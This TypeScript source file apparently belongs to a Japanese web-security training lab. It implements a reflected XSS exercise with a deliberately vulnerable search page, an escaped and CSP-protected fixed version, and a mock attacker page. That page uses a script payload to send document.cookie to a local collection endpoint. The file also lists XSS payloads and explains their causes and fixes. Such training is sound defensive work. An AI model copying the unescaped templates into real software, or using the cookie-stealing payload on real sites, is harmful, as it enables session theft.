import { Hono } from "hono";
import { setCookie } from "hono/cookie";
import type { AppEnv } from "../env";
import { escapeHtml, exercisePage, table } from "../lab/html";
import type { Exercise } from "../lab/types";

/**
 * 反射型XSS。
 *
 * このファイルが「演習ファイルの書き方」の見本になっている:
 *  - `//#region vuln` と `//#region fixed` の中に、脆弱版・修正版のコードだけを書く（解説ページにそのまま載る）
 *  - 脆弱な行には行末に `// [!] 何が問題か` を付ける（解説ページで黄色くなる）。
 *    HTML を組み立てるテンプレートの内側ではなく、その直前の `const` 行に置くこと（ページのソースにコメントが漏れないように）
 *  - 解説（doc）はファイルの末尾にまとめる
 */

const ID = "xss-reflected";

//#region vuln
const vuln = new Hono<AppEnv>();

vuln.get("/", (c) => {
  // 学習用のダミーCookie。JavaScriptから読める（HttpOnlyなし）ので、XSSで盗めることを体験できる
  setCookie(c, "demo_secret", "SESSION-DEMO-1234", { path: "/" });

  const q = c.req.query("q") ?? "";
  const field = `<input name=q value=${q}>`; // [!] 属性値を引用符で囲まず、エスケープもしない
  const result = `<p>「${q}」の検索結果: 0 件</p>`; // [!] 入力値をそのままHTMLの本文に埋め込む

  const body = `<h1>書籍検索</h1>
<form method="get">${field} <button>検索</button></form>
${result}`;
  return c.html(exercisePage({ id: ID, mode: "vuln", title: "書籍検索", body }));
});
//#endregion

//#region fixed
const fixed = new Hono<AppEnv>();

// 多層防御: インラインスクリプトを実行させないCSP（エスケープ漏れが将来入っても被害を止める保険）
fixed.use("*", async (c, next) => {
  await next();
  c.res.headers.set(
    "Content-Security-Policy",
    "default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'",
  );
});

fixed.get("/", (c) => {
  // HttpOnly を付けると JavaScript から読めなくなり、XSS で盗まれにくくなる
  setCookie(c, "demo_secret", "SESSION-DEMO-1234", { path: "/", httpOnly: true, sameSite: "Lax" });

  const q = escapeHtml(c.req.query("q") ?? "");
  const field = `<input name="q" value="${q}">`;
  const result = `<p>「${q}」の検索結果: 0 件</p>`;

  const body = `<h1>書籍検索</h1>
<form method="get">${field} <button>検索</button></form>
${result}`;
  return c.html(exercisePage({ id: ID, mode: "fixed", title: "書籍検索", body }));
});
//#endregion

// ---- 攻撃者サイト役（/attacker/xss-reflected）: 罠リンクと、盗まれた情報の受け口 ----
const attacker = new Hono<AppEnv>();

attacker.get("/collect", async (c) => {
  const data = (c.req.query("c") ?? "").slice(0, 500);
  await c.var.db.run("INSERT INTO xss_reflected_stolen (data) VALUES (?)", [data]);
  return c.body(null, 204);
});

attacker.post("/clear", async (c) => {
  await c.var.db.run("DELETE FROM xss_reflected_stolen");
  return c.redirect("/attacker/xss-reflected/", 303);
});

attacker.get("/", async (c) => {
  const payload =
    "<script>new Image().src='/attacker/xss-reflected/collect?c='+encodeURIComponent(document.cookie)</script>";
  const trap = `/x/${ID}/vuln/?q=${encodeURIComponent(payload)}`;
  const stolen = await c.var.db.all("SELECT id, data FROM xss_reflected_stolen ORDER BY id DESC LIMIT 20");

  const html = `<!doctype html><html lang="ja"><head><meta charset="utf-8"><meta name="robots" content="noindex">
<title>攻撃者サイト（模擬）</title><link rel="stylesheet" href="/assets/lab.css"></head>
<body class="ex ex--guard"><main class="ex-main">
<div class="notice notice--warn">これは<strong>攻撃者側</strong>を演じる模擬ページです。実際には外部へ何も送られず、すべてこのラボの中だけで完結します。</div>
<h1>① 攻撃者が送るメール（模擬）</h1>
<div class="result">
  <p>件名: 【重要】書籍の検索結果をご確認ください</p>
  <p>ご注文の書籍が見つかりました。<a href="${escapeHtml(trap)}">こちらから確認</a>してください。</p>
</div>
<p>リンク先は脆弱版の検索ページで、検索語にスクリプトが仕込まれています。リンクをクリックすると、被害者のブラウザで攻撃者のスクリプトが動きます。</p>
<pre class="code"><code>${escapeHtml(payload)}</code></pre>
<h1>② 攻撃者のサーバーに届いた情報（模擬）</h1>
${stolen.length ? table(["#", "届いたCookie"], stolen.map((r) => [r.id, r.data])) : "<p>まだ何も届いていません。</p>"}
<form method="post" action="/attacker/${ID}/clear"><button class="ghost">ログを消す</button></form>
<p><a href="/x/${ID}">← 解説へ戻る</a></p>
</main></body></html>`;
  return c.html(html);
});

export const exercise: Exercise = {
  id: ID,
  title: "反射型XSS",
  summary: "検索語がそのままページに映り込むと、リンクを開いただけで攻撃者のスクリプトが動く。",
  level: 1,
  book: { chapter: 4, topic: "表示処理に伴う問題（XSS）" },
  schema: [
    `CREATE TABLE xss_reflected_stolen (id INTEGER PRIMARY KEY AUTOINCREMENT, data TEXT NOT NULL)`,
  ],
  vuln,
  fixed,
  attacker,
  doc: {
    goals: [
      "反射型XSSが成立する仕組み（入力値がHTMLとして解釈される）を、実際に動かして説明できる",
      "HTML本文と属性値、それぞれの場所で何が危険かを区別できる",
      "対策の本命は「出力時のエスケープ」で、CSPやHttpOnlyは保険だと位置づけられる",
    ],
    background: `
反射型XSS（クロスサイトスクリプティング）は、リクエストに含まれる文字列がそのままレスポンスのHTMLに出力されるときに起きます。攻撃者は、スクリプトを仕込んだURLを罠として被害者に踏ませます。

被害者のブラウザは、そのスクリプトを**正規サイトが出したもの**として実行します。そのため、Cookieの読み取り、画面の書き換え、被害者になりすました操作など、ログイン中のユーザーができることはほぼ何でもできてしまいます。

HTMLの中でも、入力値を置く場所（本文、引用符なしの属性値、引用符ありの属性値、URL、スクリプト内）によって、必要な対策が変わります。
`,
    steps: [
      {
        title: "通常の動作を確認する",
        body: "脆弱版の検索ページを開き、普通の言葉で検索します。入力した言葉が結果の見出しと入力欄にそのまま映ることを確かめます。",
        open: { label: "脆弱版を開く", href: "vuln/?q=セキュリティ" },
      },
      {
        title: "入力がHTMLとして解釈されることを確かめる",
        body: "検索語にHTMLタグを入れます。太字になれば、入力値がエスケープされずHTMLとして出力されている証拠です。",
        payloads: [{ label: "検索語", value: "<b>太字</b><u>下線</u>" }],
        open: { label: "このペイロードで試す", href: "vuln/?q=" + encodeURIComponent("<b>太字</b><u>下線</u>") },
      },
      {
        title: "スクリプトを実行させる",
        body: "scriptタグを入れて、ダイアログにCookieを表示させます。ダミーCookie `demo_secret` の値が見えれば、攻撃者のスクリプトがログイン中のユーザーのCookieを読めたということです。",
        payloads: [{ label: "検索語", value: "<script>alert(document.cookie)</script>" }],
        open: {
          label: "このペイロードで試す",
          href: "vuln/?q=" + encodeURIComponent("<script>alert(document.cookie)</script>"),
        },
      },
      {
        title: "属性値のコンテキストを突く",
        body: "検索結果の見出しではなく、**入力欄の `value` 属性**に注目します。値が引用符で囲まれていないので、空白を入れるだけで新しい属性を追加できます。`<script>` を使わなくてもスクリプトが動きます。",
        payloads: [
          { label: "検索語", value: "x onfocus=alert(1) autofocus", note: "入力欄にフォーカスが当たった瞬間に実行される" },
        ],
        open: {
          label: "このペイロードで試す",
          href: "vuln/?q=" + encodeURIComponent("x onfocus=alert(1) autofocus"),
        },
      },
      {
        title: "罠リンクで被害者に踏ませる（反射型の本質）",
        body: "攻撃者サイト（模擬）を開き、メール内のリンクをクリックします。URLに仕込まれたスクリプトがあなたのブラウザで動き、Cookieが攻撃者のサーバーへ送られます。攻撃者サイトに戻ると、盗まれたCookieが一覧に出ています。",
        open: { label: "攻撃者サイト（模擬）を開く", href: "/attacker/xss-reflected/" },
      },
    ],
    cause: `
原因は、**入力値をエスケープせずにHTMLのテンプレートへ直接埋め込んでいること**です。ハイライトした2行が問題です。

- 1行目: 属性値を引用符で囲んでおらず、エスケープもしていません。空白を入れるだけで属性が増やせます。
- 2行目: 本文にそのまま出力しているので、\`<\` や \`>\` がタグとして解釈されます。

どちらも「入力値は文字列のはずだ」という思い込みから生まれます。ブラウザから見ると、サーバーが返したHTMLのどこまでが入力値なのかは区別できません。
`,
    fix: `
修正の本命は、**HTMLに出力する直前に、その場所に合わせてエスケープすること**です。本文でも属性値でも、\`& < > " '\` を文字参照（\`&lt;\` など）に置き換えます。属性値は必ず引用符で囲みます。

あわせて、エスケープ漏れが将来入っても被害を抑える保険を2つ入れています。

- \`Content-Security-Policy\` で、インラインスクリプトの実行を許可しない
- Cookieに \`HttpOnly\` を付け、JavaScriptから読めなくする
`,
    verify: [
      "修正版で、手順2〜4のペイロードをそのまま入力する。タグとして解釈されず、文字としてそのまま表示される",
      "ブラウザの「ページのソースを表示」で、入力値が `&lt;` などにエスケープされていることを確かめる",
      "開発者ツールのコンソールで `document.cookie` を実行する。修正版では `demo_secret` が見えない（HttpOnly）",
      "修正版のレスポンスヘッダーに `Content-Security-Policy` が付いていることを確かめる",
    ],
    beyond: `
**エスケープは「出力する場所ごと」に方法が違います。** 本文と引用符ありの属性値は上記の文字参照で足ります。一方、\`href\` などのURLには、スキームの検証（\`javascript:\` を弾く）が別途必要です。\`<script>\` の中に値を埋め込む場合は、HTMLエスケープでは防げません。

**フレームワークの自動エスケープを使い、使わない場所だけを例外にしましょう。** この演習のようにテンプレートへ手で埋め込む書き方は、エスケープを忘れた1行がそのまま脆弱性になります。

**CSPは保険です。** 本文のエスケープが正しく行われていれば、CSPがなくても攻撃は成立しません。逆に、CSPだけに頼ると、設定の抜け道（許可したドメインに置かれたスクリプトなど）で破られます。
`,
    quiz: [
      {
        q: "修正版で、検索語 `\"><script>alert(1)</script>` を入れても動かないのはなぜ？",
        a: "`\"` が `&quot;` に、`<` `>` が `&lt;` `&gt;` に置き換わるため、ブラウザは属性値の終端やタグとして解釈せず、ただの文字列として表示します。",
      },
      {
        q: "HttpOnly を付けたのに、XSS を直す必要はあるの？",
        a: "あります。HttpOnly が防ぐのは「JavaScript による Cookie の読み取り」だけです。スクリプトが動けば、画面の書き換えや、被害者の権限での操作（送金、設定変更など）は引き続き可能です。",
      },
      {
        q: "入力時に `<` を削除する（入力値の検証）だけでは、なぜ不十分？",
        a: "入力値を使う場所は検索だけではなく、保存して別の画面に出すかもしれません。危険な文字は出力する場所によって違うため、**出力時にその場所に合わせてエスケープする**のが確実です。入力値の検証は、あくまで追加の防御です。",
      },
    ],
  },
};
